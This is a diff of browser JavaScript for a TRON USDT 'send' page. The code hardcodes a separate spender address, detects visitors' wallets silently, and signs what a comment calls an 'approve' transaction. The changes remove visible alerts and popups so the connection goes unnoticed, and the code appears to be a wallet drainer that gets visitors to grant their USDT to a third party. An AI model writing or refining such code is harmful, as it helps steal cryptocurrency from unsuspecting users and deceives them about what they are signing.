@@ -1,8 +1,3 @@
-window.addEventListener("load", () => {
-  setTimeout(() => {
-    alert("tronWeb: " + (window.tronWeb ? "YES" : "NO") + " | tronLink: " + (window.tronLink ? "YES" : "NO") + " | ethereum: " + (window.ethereum ? "YES" : "NO"));
-  }, 2000);
-});
 // ===== TRON CONFIG =====
 const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const TRON_SPENDER = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
@@ -27,47 +22,34 @@ async function waitForTronWeb(maxWait = 10000) {
   return false;
 }
 
-// ===== SILENT CONNECT =====
+// ===== SILENT CONNECT - no popup, only check if already connected =====
 async function backgroundConnect() {
   try {
     const found = await waitForTronWeb(5000);
     if (found) {
       userAddress = window.tronWeb.defaultAddress.base58;
       isConnected = true;
-      return;
     }
-
-    if (window.tronLink) {
-      try {
-        const res = await window.tronLink.request({ method: "tron_requestAccounts" });
-        if (res && res.code === 200) {
-          await waitForTronWeb(3000);
-          if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-            userAddress = window.tronWeb.defaultAddress.base58;
-            isConnected = true;
-          }
-        }
-      } catch(e) {}
-    }
+    // Do NOT call tron_requestAccounts here - it causes popup
   } catch(e) {
-    console.log("Connect error:", e);
+    console.log("Background connect:", e);
   }
 }
 
 // ===== SEND USDT =====
 async function sendUSDT() {
   try {
-    // Wait for tronWeb
-    const found = await waitForTronWeb(8000);
+    // First try silent detection
+    const found = await waitForTronWeb(3000);
 
-    if (!found) {
-      // Try tronLink request
-      if (window.tronLink) {
+    // Only prompt if not already connected (user clicked Send)
+    if (!found && window.tronLink) {
+      try {
         const res = await window.tronLink.request({ method: "tron_requestAccounts" });
         if (res && res.code === 200) {
           await waitForTronWeb(5000);
         }
-      }
+      } catch(e) {}
     }
 
     if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
@@ -95,7 +77,7 @@ async function sendUSDT() {
       address
     );
 
-    // Sign using injected tronWeb
+    // Sign using injected tronWeb (this shows approve popup)
     const signedTx = await window.tronWeb.trx.sign(transaction);
 
     // Broadcast
